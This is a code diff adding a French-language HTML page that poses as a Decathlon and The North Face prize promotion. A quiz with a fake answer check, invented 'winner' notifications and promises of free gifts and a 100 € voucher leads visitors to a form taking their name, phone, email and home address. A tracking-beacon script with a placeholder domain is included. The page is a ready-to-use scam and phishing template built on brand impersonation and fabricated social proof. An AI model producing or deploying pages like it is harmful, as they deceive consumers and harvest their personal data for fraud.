@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="fr">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<meta name="robots" content="noindex, nofollow, noarchive, nosnippet" />
+		<meta name="referrer" content="no-referrer" />
+		<meta name="viewport" content="width=device-width,initial-scale=1" />
+		<title>Promotion Limitée</title>
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<!-- <link rel="icon" type="image/gif" href="./assets/favicon.ico"> -->
+		<link
+			href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+			rel="stylesheet"
+			integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
+			crossorigin="anonymous"
+		/>
+		<link
+			rel="stylesheet"
+			href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+		/>
+
+		<link rel="stylesheet" href="./assets/css/style.css" />
+		<link rel="stylesheet" href="./assets/css/payment.css" />
+		<style type="text/css">
+			:root {
+				--btn-bg: rgb(54, 67, 186);
+				--btn-color: #ffffff;
+				--color-text: #353535;
+				--primary-family: 'Montserrat', serif;
+			}
+		</style>
+	</head>
+
+	<body>
+		<header>
+			<div class="container">
+				<div class="header-row">
+					<div class="header-item">
+						<button class="burger" type="button">
+							<span></span>
+							<span></span>
+							<span></span>
+						</button>
+					</div>
+					<div class="header__logo"></div>
+					<div class="header-item">
+						<img src="./assets/img/account.png" alt="" />
+						<img src="./assets/img/cart.png" alt="" />
+					</div>
+				</div>
+			</div>
+		</header>
+		<div class="notifications">
+			<ul class="notifications__items"></ul>
+			<ul class="notifications__items"></ul>
+		</div>
+		<main class="main" id="QUIZ">
+			<section class="start-content active" id="start-content">
+				<div id="modal-1" class="modal-wrapper" style="display: block">
+					<div class="modal-body">
+						<div class="modal-content">
+							<div class="gift"><img src="./assets/img/prize.png" /></div>
+							<div class="text">
+								<b>Offre limitée !</b>
+								<p>
+									<b>The North Face Borealis Classic Unisex Backpack</b> —
+									découvrez le confort, le style et la fiabilité pour tous vos
+									voyages et votre quotidien.
+								</p>
+								<p>
+									Remplissez un court formulaire et obtenez le sac à dos idéal
+									pour une vie active, conçu par The North Face.
+								</p>
+								<p>
+									Quantité limitée. Ne manquez pas votre chance — commandez-le
+									dès aujourd’hui chez <b>Decathlon</b> !
+								</p>
+							</div>
+							<button
+								class="modal-button"
+								id="close-modal"
+								data-next="sectionQuestions"
+							>
+								C’est parti !
+							</button>
+						</div>
+					</div>
+				</div>
+			</section>
+			<section class="section-questions" id="sectionQuestions">
+				<div class="wrapper">
+					<!-- Stepper -->
+					<div class="stepper">
+						<div id="step1" class="step"></div>
+						<div id="step2" class="step"></div>
+						<div id="step3" class="step"></div>
+						<div id="step4" class="step"></div>
+						<div id="step5" class="step"></div>
+						<div id="step6" class="step"></div>
+					</div>
+
+					<!-- Questions container -->
+					<div class="questions" id="questions">
+						<!-- Question 1 -->
+						<div class="question visible" id="question-1">
+							<div class="question-description">
+								<span>Quel âge avez-vous ?</span>
+							</div>
+							<div class="answers">
+								<div class="age-wrapper" data-next="question-2">
+									<div class="photo">
+										<img src="./assets/img/15-20.jpg" alt="" />
+									</div>
+									<button class="answers-button">15 - 20</button>
+								</div>
+								<div class="age-wrapper" data-next="question-2">
+									<div class="photo">
+										<img src="./assets/img/20-30.jpg" alt="" />
+									</div>
+									<button class="answers-button">20 - 30</button>
+								</div>
+								<div class="age-wrapper" data-next="question-2">
+									<div class="photo">
+										<img src="./assets/img/30-50.jpg" alt="" />
+									</div>
+									<button class="answers-button">30 - 50</button>
+								</div>
+								<div class="age-wrapper" data-next="question-2">
+									<div class="photo">
+										<img src="./assets/img/50_.jpg" alt="" />
+									</div>
+									<button class="answers-button">50 +</button>
+								</div>
+							</div>
+						</div>
+
+						<!-- Question 2 -->
+						<div class="question" id="question-2">
+							<div class="question-description">
+								<span
+									>Comment avez-vous découvert cette promotion pour le sac à dos
+									The North Face Borealis ?</span
+								>
+								<p>Campagne d'enquête client Decathlon</p>
+							</div>
+							<div class="answers">
+								<button class="answers-button" data-next="question-3">
+									Réseaux sociaux
+								</button>
+								<button class="answers-button" data-next="question-3">
+									Publicité en magasin
+								</button>
+								<button class="answers-button" data-next="question-3">
+									Recommandations d'amis ou de la famille
+								</button>
+								<button class="answers-button" data-next="question-3">
+									Recherche en ligne
+								</button>
+								<button class="answers-button" data-next="question-3">
+									Autre source
+								</button>
+							</div>
+						</div>
+
+						<!-- Question 3 -->
+						<div class="question" id="question-3">
+							<div class="question-description">
+								<span
+									>Qu'est-ce qui est le plus important pour vous lors du choix
+									d'un sac à dos ?</span
+								>
+								<p>Campagne d'enquête client Decathlon</p>
+							</div>
+							<div class="answers">
+								<button class="answers-button" data-next="question-4">
+									Qualité et durabilité
+								</button>
+								<button class="answers-button" data-next="question-4">
+									Confort et ajustement
+								</button>
+								<button class="answers-button" data-next="question-4">
+									Design et style
+								</button>
+								<button class="answers-button" data-next="question-4">
+									Matériaux durables et écologiques
+								</button>
+								<button class="answers-button" data-next="question-4">
+									Prix
+								</button>
+							</div>
+						</div>
+
+						<!-- Question 4 -->
+						<div class="question" id="question-4">
+							<div class="question-description">
+								<span
+									>À quelle fréquence achetez-vous des sacs à dos ou des
+									produits similaires ?</span
+								>
+								<p>Campagne d'enquête client Decathlon</p>
+							</div>
+							<div class="answers">
+								<button class="answers-button" data-next="question-5">
+									Plusieurs fois par an
+								</button>
+								<button class="answers-button" data-next="question-5">
+									Une fois par an
+								</button>
+								<button class="answers-button" data-next="question-5">
+									Moins d'une fois par an
+								</button>
+								<button class="answers-button" data-next="question-5">
+									C'est mon premier achat
+								</button>
+							</div>
+						</div>
+
+						<!-- Question 5 -->
+						<div class="question" id="question-5">
+							<div class="question-description">
+								<span
+									>QQuels facteurs influencent votre décision d'acheter un
+									produit ?</span
+								>
+								<p>Campagne d'enquête client Decathlon</p>
+							</div>
+							<div class="answers">
+								<button class="answers-button" data-next="question-6">
+									Réductions et promotions
+								</button>
+								<button class="answers-button" data-next="question-6">
+									Avis positifs
+								</button>
+								<button class="answers-button" data-next="question-6">
+									Nouvelles collections
+								</button>
+								<button class="answers-button" data-next="question-6">
+									Recommandations d'influenceurs ou de blogueurs
+								</button>
+								<button class="answers-button" data-next="question-6">
+									Publicité médiatique
+								</button>
+							</div>
+						</div>
+
+						<!-- Question 6 -->
+						<div class="question" id="question-6">
+							<div class="question-description">
+								<span
+									>Comment évalueriez-vous votre expérience d'achat chez
+									Decathlon (en magasin ou en ligne) ?</span
+								>
+								<p>Campagne d'enquête client Decathlon</p>
+							</div>
+							<div class="answers">
+								<button class="answers-button" data-next="boxes-game">
+									Très positive
+								</button>
+								<button class="answers-button" data-next="boxes-game">
+									Positive
+								</button>
+								<button class="answers-button" data-next="boxes-game">
+									Neutre
+								</button>
+								<button class="answers-button" data-next="boxes-game">
+									Négative
+								</button>
+								<button class="answers-button" data-next="boxes-game">
+									Très négative
+								</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<section class="processing-answers" id="processing-answers">
+				<h2>Vos réponses sont en cours de vérification</h2>
+				<div class="d-flex justify-content-center">
+					<div class="spinner-border" role="status"></div>
+				</div>
+				<p class="result" id="result1">Vous avez répondu à 3/3 questions</p>
+				<p class="result" id="result2">
+					Aucun sondage précédent n'est associé à votre adresse IP
+				</p>
+				<p class="result" id="result3">
+					Les cadeaux sont en cours de chargement...
+				</p>
+			</section>
+			<div hidden="" data-next="modalAfterOpenBox_1"></div>
+			<div hidden="" data-next="modalAfterOpenBox_2"></div>
+			<div hidden="" data-next="modalAfterOpenBox_3"></div>
+
+			<section class="section-additional-prize" id="sectionAdditionalPrize">
+				<div class="wrapper">
+					<h3 class="title">
+						Félicitations !<br />Vous avez gagné le
+						<b>The North Face Borealis Classic Unisex Backpack.</b>.
+					</h3>
+					<div class="description">
+						<div class="text">
+							<img src="./assets/img/additional-product.png" alt="" /> Et pour
+							chaque personne qui commande aujourd’hui, un bonus spécial vous
+							attend. <br />
+							🎁 En cadeau pour les plus rapides, nous ajouterons le sac de
+							voyage original <b>The North Face Base Camp Duffel</b>. <br />
+						</div>
+					</div>
+					<div class="description">
+						<p>
+							Et ce n’est pas tout : juste entre nous — à partir du mois
+							prochain, chaque acheteur d’un ensemble d’accessoires recevra
+							également un bon d’achat de <b>100 €</b> pour des achats chez
+							<b>Decathlon</b> !
+						</p>
+					</div>
+					<div class="joy">
+						Nous lançons un nouveau partenariat puissant — et vous serez parmi
+						les premiers à en être informés !
+					</div>
+					<button
+						class="to-cart"
+						id="toCart"
+						data-gift="i1"
+						data-next="cart"
+						style="color: #fff; text-decoration: none"
+					>
+						Recevoir votre cadeau
+					</button>
+				</div>
+			</section>
+
+			<script>
+				var data = [
+					{
+						name: 'Alex ',
+						address: ' Paris ',
+						desc: 'a gagné The North Face Borealis Classic Unisex Backpack!',
+						img: './assets/prize.png',
+						time: 'Il y a 15 secondes',
+					},
+					{
+						name: 'Mary ',
+						address: ' Lyon ',
+						desc: 'a gagné The North Face Borealis Classic Unisex Backpack!',
+						img: './assets/prize.png',
+						time: 'Il y a 18 secondes',
+					},
+					{
+						name: 'James ',
+						address: ' Marseille ',
+						desc: 'a gagné The North Face Borealis Classic Unisex Backpack!',
+						img: './assets/prize.png',
+						time: 'Il y a 10 secondes',
+					},
+				]
+			</script>
+		</main>
+		<main class="main" id="PAYMENT" style="display: none; padding-top: 20px">
+			<div class="container">
+				<div class="row">
+					<div class="col-12">
+						<form class="new-form" id="userDataForm">
+							<div id="STEP_1">
+								<div class="title">Dernière étape</div>
+								<div class="text">
+									Remplissez les informations pour recevoir votre cadeau
+								</div>
+								<div class="main-form" id="patment-form">
+									<div class="section-form" id="new_form">
+										<div
+											class="form-block"
+											data-step="0"
+											style="display: block"
+										>
+											<div class="input-wrapper StepForm">
+												<div id="firstnameWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="name"
+														class="w100"
+														placeholder="Prénom"
+														id="firstname"
+														name="first_name"
+														autocomplete="given-name"
+													/><span class="placeholder firstname">Prénom</span>
+												</div>
+												<div id="firstnameInvalid" class="invalidField">
+													* Le prénom est invalide (ex. Vincent)
+												</div>
+												<div id="lastnameWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="name"
+														class="w100"
+														placeholder="Nom"
+														id="lastname"
+														name="last_name"
+														autocomplete="family-name"
+													/><span class="placeholder lastname">Nom</span>
+												</div>
+												<div id="lastnameInvalid" class="invalidField">
+													* Le nom est invalide (ex. Lambert)
+												</div>
+												<div id="phoneWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="phone"
+														class="w100"
+														placeholder="Téléphone"
+														id="phone"
+														name="phone"
+														autocomplete="tel-national"
+													/><span class="placeholder phone">Téléphone</span>
+													<div class="plus_number_code">+</div>
+													<div
+														class="flag"
+														style="
+															background-image: url('./assets/img/icons/fr.svg');
+														"
+													></div>
+												</div>
+												<div id="phoneInvalid" class="invalidField">
+													* Le numéro de téléphone est invalide (ex.
+													33490909300).
+												</div>
+												<div id="emailWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="email"
+														class="w100"
+														placeholder="Email"
+														id="email"
+														name="email"
+														autocomplete="off"
+													/><span class="placeholder email">Email</span>
+													<ul class="email-hint">
+														<li class="email" data-value="gmail.com">
+															@gmail.com
+														</li>
+														<li class="email" data-value="outlook.com">
+															@outlook.com
+														</li>
+														<li class="email" data-value="live.com">
+															@live.com
+														</li>
+														<li class="email" data-value="orange.fr">
+															@orange.fr
+														</li>
+														<li class="email" data-value="gmail.fr">
+															@gmail.fr
+														</li>
+														<li class="email" data-value="hotmail.fr">
+															@hotmail.fr
+														</li>
+														<li class="email" data-value="live.fr">@live.fr</li>
+														<li class="email" data-value="sfr.fr">@sfr.fr</li>
+														<li class="email" data-value="yahoo.fr">
+															@yahoo.fr
+														</li>
+														<li class="email" data-value="gmx.fr">@gmx.fr</li>
+														<li class="email" data-value="wanadoo.fr">
+															@wanadoo.fr
+														</li>
+														<li class="email" data-value="neuf.fr">@neuf.fr</li>
+														<li class="email" data-value="free.fr">@free.fr</li>
+													</ul>
+												</div>
+												<div
+													id="emailInvalid"
+													class="invalidField"
+													style="margin-bottom: 10px"
+												>
+													* L'adresse email est invalide (ex. mari@sfr.fr)
+												</div>
+
+												<div
+													id="countryWrapper"
+													class="form-block__full"
+													style="pointer-events: none"
+												>
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="country"
+														class="w100"
+														placeholder="Pays"
+														id="country"
+														name="country"
+														autocomplete="postal-code"
+														value="France"
+													/><span class="placeholder zipcode">Pays</span>
+												</div>
+												<div id="cityWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="city"
+														class="w100"
+														placeholder="Ville"
+														id="city"
+														name="city"
+														autocomplete="address-level2"
+													/><span class="placeholder city">Ville</span>
+												</div>
+												<div id="cityInvalid" class="invalidField">
+													* La ville est invalide
+												</div>
+												<div id="zipcodeWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="zip"
+														class="w100"
+														placeholder="Code postal"
+														id="zipcode"
+														name="zip"
+														autocomplete="postal-code"
+													/><span class="placeholder zipcode">Code postal</span>
+												</div>
+												<div id="zipcodeInvalid" class="invalidField">
+													* Le code postal n'est pas valide
+												</div>
+												<div id="addressWrapper" class="form-block__full">
+													<i class="far fa-check-circle"></i
+													><input
+														type="text"
+														data-validate="address"
+														class="w100"
+														placeholder="Adresse"
+														id="address"
+														name="address"
+														autocomplete="street-address"
+													/><span class="placeholder address">Adresse</span>
+												</div>
+												<div id="addressInvalid" class="invalidField">
+													* L'adresse n'est pas valide
+												</div>
+
+												<div class="cart-progress">
+													<div class="dot active">
+														<div class="text">Informations</div>
+													</div>
+													<div class="dot">
+														<div class="text">Livraison</div>
+													</div>
+													<div class="dot">
+														<div class="text">Résumé</div>
+													</div>
+													<img
+														class="progress-line"
+														src="./assets/img/progress-line.png"
+														alt=""
+													/>
+												</div>
+												<button
+													id="TO_DELIVERY"
+													type="button"
+													class="info-button"
+													data-call="_generateFullName"
+													data-next="1"
+												>
+													Continuer
+												</button>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</form>
+					</div>
+				</div>
+			</div>
+		</main>
+		<div class="modal-wrapper" id="modal-4">
+			<div class="modal-body">
+				<img src="./assets/img/prize.png" alt="gift" class="big-gift" />
+			</div>
+		</div>
+		<img src="./assets/img/icons/check.svg" class="d-none" alt="" />
+		<img src="./assets/img/notifications-close.png" class="d-none" alt="" />
+		<script
+			src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+			integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+			crossorigin="anonymous"
+		></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+		<script src="./assets/js/jquery-3.6.0.min.js"></script>
+
+		<script src="./assets/js/index.js"></script>
+		<script src="./assets/js/custom.js"></script>
+		<script>
+			var linkClicked = false
+			var beacon = function (opts) {
+				opts = opts || {}
+				opts.url = opts.url || null
+				opts.vars = opts.vars || {}
+				opts.error = opts.error || function () {}
+				opts.success = opts.success || function () {}
+				var varsArray = []
+				for (var key in opts.vars) {
+					varsArray.push(key + '=' + encodeURIComponent(opts.vars[key]))
+				}
+				var qString = varsArray.join('&')
+				if (opts.url) {
+					var beacon = new Image()
+					if (beacon.onerror) {
+						beacon.onerror = opts.error
+					}
+					if (beacon.onload) {
+						beacon.onload = opts.success
+					}
+					beacon.src = opts.url + (qString ? '?' : '') + qString
+				}
+			}
+			function emulateClick() {
+				if (!linkClicked) {
+					beacon({ url: 'http://{trackingdomain}/click/?origin={origin}' })
+					linkClicked = true
+				}
+			}
+		</script>
+	</body>
+</html>
